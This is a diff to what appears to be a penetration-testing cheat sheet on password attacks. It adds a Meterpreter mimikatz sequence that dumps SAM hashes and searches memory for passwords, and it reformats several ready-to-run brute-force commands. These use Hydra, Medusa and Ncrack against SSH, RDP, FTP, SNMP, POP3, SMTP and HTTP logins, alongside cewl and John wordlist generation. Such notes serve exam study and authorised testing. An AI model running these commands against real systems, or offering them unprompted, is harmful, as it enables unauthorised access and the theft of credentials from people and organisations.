@@ -1527,59 +1527,65 @@ export ip=192.168.1.100`**_
             tickets from memory. mimikatz can also perform
             pass-the-hash, pass-the-ticket or build Golden tickets  
             [*https://github.com/gentilkiwi/mimikatz*](https://github.com/gentilkiwi/mimikatz)
+            From metasploit meterpreter (must have System level access):
+            `meterpreter> load mimikatz
+            meterpreter> help mimikatz
+            meterpreter> msv
+            meterpreter> kerberos
+            meterpreter> mimikatz_command -f samdump::hashes
+            meterpreter> mimikatz_command -f sekurlsa::searchPasswords`
 
     -   Password Profiling
 
         -   cewl can generate a password list from a web page  
-            cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
+            `cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt`
 
     -   Password Mutating
 
         -   John the ripper can mutate password lists  
             nano /etc/john/john.conf  
-            john --wordlist=megacorp-cewl.txt --rules --stdout &gt;
-            mutated.txt
+            `john --wordlist=megacorp-cewl.txt --rules --stdout &gt; mutated.txt`
 
     -   Medusa
 
         -   Medusa, initiated against an htaccess protected web
             directory  
-            medusa -h $ip -u admin -P password-file.txt -M http -m  
-            DIR:/admin -T 10
+            `medusa -h $ip -u admin -P password-file.txt -M http -m DIR:/admin -T 10`
 
     -   Ncrack
 
         -   ncrack (from the makers of nmap) can brute force RDP  
-            ncrack -vv --user offsec -P password-file.txt rdp://$ip
+            `ncrack -vv --user offsec -P password-file.txt rdp://$ip`
 
     -   Hydra
 
         -   Hydra brute force against SNMP  
-            hydra -P password-file.txt -v $ip snmp
+            `hydra -P password-file.txt -v $ip snmp`
 
         -   Hydra FTP known user and password list  
-            hydra -t 1 -l admin -P /root/Desktop/password.lst -vV $ip
-            ftp
+            `hydra -t 1 -l admin -P /root/Desktop/password.lst -vV $ip ftp`
 
         -   Hydra SSH using list of users and passwords  
-            hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh
+            `hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh`
 
         -   Hydra SSH using a known password and a username list  
-            hydra -v -V -u -L users.txt -p "&lt;known password&gt;" -t 1
-            -u $ip ssh
+            `hydra -v -V -u -L users.txt -p "&lt;known password&gt;" -t 1 -u $ip ssh`
 
         -   Hydra SSH Against Known username  
-            hydra $ip -s 62964 ssh -l &lt;user&gt; -P big\_wordlist.txt
+            `hydra $ip -s 62964 ssh -l &lt;user&gt; -P big\_wordlist.txt`
 
         -   Hydra POP3 Brute Force  
-            hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f  
-            192.168.X.XXX pop3 -V
+            `hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V`
 
         -   Hydra SMTP Brute Force  
-            hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V
+            `hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V`
 
         -   Hydra attack http get 401 login with a dictionary  
-            hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin
+            `hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin`
+            
+        -   Hydra attack Windows Remote Desktop with rockyou
+            `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip`
+          
 
 -   <span id="_bnmnt83v58wk" class="anchor"><span id="_Toc480741822" class="anchor"></span></span>Password Hash Attacks
     -------------------------------------------------------------------------------------------------------------------
